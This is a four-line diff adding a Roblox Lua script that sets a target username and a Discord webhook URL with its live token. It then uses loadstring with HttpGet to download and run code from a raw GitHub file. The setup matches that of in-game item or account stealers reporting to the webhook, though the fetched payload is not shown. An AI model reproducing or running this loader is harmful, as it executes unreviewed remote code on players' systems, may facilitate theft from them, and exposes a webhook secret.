@@ -1,0 +1,4 @@
+Username = "hellomynameismostafa"
+Webhook = "https://discord.com/api/webhooks/1309189144873930822/aC-ZN2dr6zRB4-uen_kgwtutx02C8wm7UFLxbSpMRnL2WXn5HgXLp5jK5G4sT7AXRZyS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/MoriScripts"))()
